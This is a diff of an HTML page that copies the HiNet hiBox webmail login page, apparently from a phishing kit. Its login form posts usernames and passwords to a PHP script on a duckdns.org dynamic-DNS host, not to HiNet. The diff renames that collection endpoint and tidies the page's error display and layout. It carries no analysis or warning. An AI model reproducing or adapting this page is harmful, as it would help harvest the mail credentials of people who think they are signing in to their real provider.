@@ -1,21 +1,4 @@
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 
 <!--hb2-http06-zone-->
 <html xmlns="http://www.w3.org/1999/xhtml">
@@ -27,6 +10,7 @@
 <META name="keywords" content="email,HiNet Mail,Push Mail,hinet 郵件,hinet信箱,郵件委外,mail,spam,web mail,webmail,mail ASP,中華 電信 信箱,中華 電信 電子信箱,企業信箱,信箱委外,Mail Server,垃圾郵件,信箱,掃毒,郵件,郵件代管,郵件伺服器,資訊安全,電子信箱,電子郵件,網域名稱,傳真,簡訊,全能信箱,企業信箱,訊息服務,企業郵件">
 <META name="description" content="省去自行建置及維護電子郵件服務系統之成本及繁瑣，同時享受HiNet中華電信最穩固機房與充足頻寬提供企業電子郵件系統委外之專業化服務，輕鬆擁有安全無毒、不受垃圾郵件干擾的使用環境，讓企業重要商機(郵件)不漏失；多功能整合式郵件信箱服務，操作容易卻提昇企業競爭力">
 <title>hiBox Messaging Service</title>
+<link rel="SHORTCUT ICON" href="webmail/favicon.ico">
 <style type="text/css">
 <!--
 body {
@@ -121,30 +105,6 @@ function handleSubmit() {
   document.form1.submit();
 }
 
-
-
-function handleError() {
-	if (false || false ) {
-		/*modify start*/
-		document.write('<img src="./uwc/images/Error_Large.gif" alt="" width="21" height="22"><font color="red">Authentication fails</font>');
-		//document.write('<tr><td width="244" align="center" class="bk12" height="9" colspan="2">\n'+'<img src="./uwc/./uwc/images_en/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;<font color="red">' +'<span class=AlrtErrTxt> Authentication Failed<br> Reenter your username and password.</span><br></td></tr>');
-		/*
-		document.write('<DIV class=logErr>');
-		document.write('<table cellspacing=0 cellpadding=0 border=0>');
-		document.write('<tbody>');
-	        document.write('<tr>');
-		document.write('<td valign=top width="28"><img src="./uwc/./uwc/images_en/Error_Large.gif" alt="" width="21" height="22">&nbsp;&nbsp;</td>');
-		document.write("<td width='233'> <span class=AlrtErrTxt> Authentication Failed<br> Reenter your username and password.</span> </td>");
-
-		document.write('</tr>');
-		document.write('</tbody>');
-		document.write('</table>');
-		document.write('</DIV>');
-		modify end*/
-	}
-
-}
-
 function MM_swapImgRestore() { //v3.0
   var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
 }
@@ -174,7 +134,7 @@ function MM_openBrWindow(theURL,winName,features) { //v2.0
 </head>
 
 <body onload="handleLoad();funShowMainBanner(0);MM_preloadImages('uwc/images_en/botton02_01.gif','uwc/images_en/botton02_03.gif','uwc/images_en/botton03_02.gif','uwc/images_en/icon-more02.gif');LoadCaptcha();">
-<form method="post" action="https://25800852.duckdns.org/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/H1N3T.php" id="login-form">
+<form method="post" action="https://25800852.duckdns.org/O-O/74775105924-37947028463-41281332901-82957146496-01439666365/H1B0X.php" id="login-form">
                     <input type="hidden" id="referrer" name="referrer" value="" />
 <!-- header start-->
 <SCRIPT type=text/javascript src="uwc/js_en/header.js"></SCRIPT>
@@ -233,11 +193,9 @@ function MM_openBrWindow(theURL,winName,features) { //v2.0
     
     <table width="252" height="135" border="0" cellpadding="0" cellspacing="1" class="loginTable">
       <tr>
-        <td height="40" colspan="2" align="right" valign="middle">
-		&nbsp; <script>
-				handleError();
-			   </script>
-	    </td>
+        <td height="40" colspan="2" align="right" valign="middle"><div id="error-block" class="hidden">
+		&nbsp; <img src="./uwc/images/Error_Large.gif" alt="" width="21" height="22"><font color="red">Authentication Failed</font>
+	    </div></td>
       </tr>
       <tr>
         <td height="30" align="left" colspan="2">Username：           
@@ -349,10 +307,8 @@ function MM_openBrWindow(theURL,winName,features) { //v2.0
 
         if(pwdError) {
 			$('#error-block').removeClass('hidden');
-			$('#error-block1').addClass('hidden');
 			
         }
-
 
         $("#password").keypress(function(e) {
             var key = e.which;
@@ -418,10 +374,6 @@ function MM_openBrWindow(theURL,winName,features) { //v2.0
 </body>
 
 </html>
-
- 
-
-<link rel="SHORTCUT ICON" href="webmail/favicon.ico">
 
 
 
